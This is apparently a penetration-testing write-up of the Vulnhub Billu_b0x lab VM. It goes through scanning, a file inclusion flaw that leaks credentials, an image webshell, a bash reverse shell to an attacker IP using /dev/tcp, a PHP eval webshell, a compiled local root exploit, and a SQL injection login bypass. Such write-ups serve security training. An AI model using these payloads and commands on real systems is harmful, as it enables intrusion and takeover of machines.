---
title: Vulnhub-billub0x
---

# Vulnhub-billub0x

## Target VM Information

### Download Link

[https://download.vulnhub.com/billu/Billu_b0x.zip](https://download.vulnhub.com/billu/Billu_b0x.zip)

### VM Description

The virtual machine is medium difficulty and uses Ubuntu 32-bit. Other software packages include PHP, Apache, and MySQL.

### Goal

Boot to root: enter the virtual machine through the web application and obtain root privileges.

### Runtime Environment

Target VM: network connection set to NAT. The target VM obtains an IP automatically.
Attacker machine: Windows10 attacker machine and Kali attacker machine. The experiment is mainly completed with the Windows attacker machine.

## Information Gathering

### Target Discovery

Start the `Billu_b0x` virtual machine. Because the VM network is set to NAT mode, use Nmap to scan the class C NAT segment of the `vm8` adapter. Command: `nmap -sP 192.168.64.1/24`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-1.png)

The target VM IP is successfully obtained: `192.168.160.187`.

### Port and Service Identification

Nmap scan:

```shell
# Scan all ports from 1 to 65535, perform service identification and deep scanning (-A), and save results to a txt file
nmap -p1-65535 -A 192.168.64.161 -oN billu.txt
```

The scan finds ports `22` (`SSH OpenSSH 5.9p1`) and `80` (`HTTP Apache httpd 2.2.22`) open.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-2.png)

Visit port `80`. A username/password input box is found, along with the hint `Show me your SQLI skills`. Fine, it wants SQL injection. I went all-in for half an hour with manual testing and `sqlmap`, but got no results, so leave it aside for now.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-3.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-4.png)

### Directory Scanning

#### dirb

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-5.png)

#### Yujian Directory Scan

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-6.png)

There are many directories. Visit them one by one.

#### Manual Probing

`in.php` is a phpinfo page. Sensitive information is found: the absolute website path is `/var/www`.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-7.png)

`allow_url_fopen = on`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-34.png)

`c.php` returns a blank page.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-9.png)

`test.php` reports an error asking me to specify `file`. Combined with the sensitive information from phpinfo, this indicates a possible file inclusion vulnerability.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-8.png)

`add.php` is a file upload interface. Use F12 to view the source and find only frontend code, with no backend interaction source code. This means it is decorative and useless.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-10.png)

`/phpmy` is a phpMyAdmin interface. Try weak passwords; they fail, so leave it aside for now.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-33.png)

## Penetration Phase

### Idea 1: Use File Inclusion to Read the Configuration File and Obtain the Root Password

From the earlier information gathering, the `test.php` page may have a file inclusion vulnerability. First pass parameters with `GET`, but there is no response. Try `POST`, and `/etc/passwd` is successfully read.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-11.png)

However, `/etc/shadow` cannot be read.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-12.png)

Try reading other directory files and audit the source code.

Directory scanning found phpMyAdmin, and phpinfo revealed the absolute website path. Try reading phpMyAdmin's default configuration file `config.inc.php`.

`file=/var/www/phpmy/config.inc.php` is read successfully, revealing the root user password: `roottoor`.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-15.png)

Use the password above to connect remotely over SSH. It succeeds. That's it????

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-16.png)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-17.png)

### Idea 2: File Inclusion + File Upload to Obtain a Shell

1. Read `c.php` and find the MySQL username/password: `b0bill:ux_billu`.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-13.png)

Log in to the previously found `/phpmy` directory. The login succeeds, and a username/password in the `auth` table is found: `biLLu:hEx_it`. Use it to log in on the homepage.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-14.png)

2. After logging in successfully, click `show user`. This is an account viewing page. Use F12 to view the existing image path.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-37.png)

It can be accessed successfully.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-38.png)

Click `add user` to enter the account creation page. This is a file upload point. A simple test shows that uploaded files are placed in the path above.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-18.png)

Try uploading a one-line webshell and find that whitelist filtering is applied.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-19.png)

Try uploading an image webshell, then use file inclusion to parse it. Because this is a `POST` request, it cannot be connected directly with AntSword. Here we can only write a command webshell and execute it through Burp with a `POST` request. To make a command webshell, write the one-liner into the middle or end of an image file with a text editor.
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-21.png)

3. Parse it on the `test.php` page. Parsing fails. Looking at the source code reveals that this page downloads the file and cannot parse it successfully.

Use the file inclusion vulnerability in `test.php` to further inspect each page's source code and look for a breakthrough. In `/panel.php`, another file inclusion vulnerability is found at `continue`. Persistence pays off.
![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-20.png)

Based on the path found above, the uploaded command webshell path is `/uploaded_images/1.jpg`. Use the file inclusion vulnerability above to parse it and successfully execute commands.

Add the command execution parameter to the POST request URL: `POST /panel.php?cmd=ls`

Include the `1.jpg` image webshell in the POST body: `load=/uploaded_images/1.jpg&continue=continue`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-22.png)

Use a bash reverse shell: `echo "bash -i >& /dev/tcp/192.168.160.129/4444 0>&1" | bash`. URL-encode the command before sending it.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-23.png)

After encoding, start an `nc` listener with `nc -lvnp 4444`, then send the command with `POST`.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-24.png)

`nc` receives the reverse shell successfully.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-25.png)

Find a writable directory and write a one-line webshell so AntSword can connect, making it easier to upload the privilege escalation exploit file.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-26.png)

The file upload directory `uploaded_images` is writable. Enter that directory and write a one-line webshell: `echo '<?php eval()$_POST[aaa]);?>' >> 1.php`

AntSword connects successfully.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-27.png)

Download the famous Ubuntu local privilege escalation exploit: [https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/)

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-28.png)

After downloading, use AntSword to upload it to the target machine's writable directory `uploaded_images`.

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-29.png)

Upload succeeds.

```shell
# Grant execute permission
chmod 777 37292.c
# Compile the exploit
gcc 37292.c -o exp
# Execute the exploit and escalate to root
./exp
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/billub0x-30.png)

Privilege escalation succeeds.

### Idea 3: Construct SQL Injection

Return to the injection page from the earlier information gathering stage, namely the homepage `index.php`. Use the discovered file inclusion vulnerability to view the SQL filtering method in the source code, then construct a targeted SQL injection.

1. Audit the `index.php` source code and find the following filtering rules:

```php
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
```

The purpose of `str_replace` is to replace the string `\'` with an empty string. Therefore, when constructing a SQL injection login payload, the payload must contain the string `\'`; otherwise, it will error. The purpose of `urldecode` is to decode the input.

2. A common login injection payload is `' or 1=1 --`. Modify it by adding `\'` at the end; `str_replace` will replace this `\'` with an empty string.

3. Injection succeeds. The payload is `' or 1=1 -- \'`; the later shell acquisition method is the same as in the experiment above.
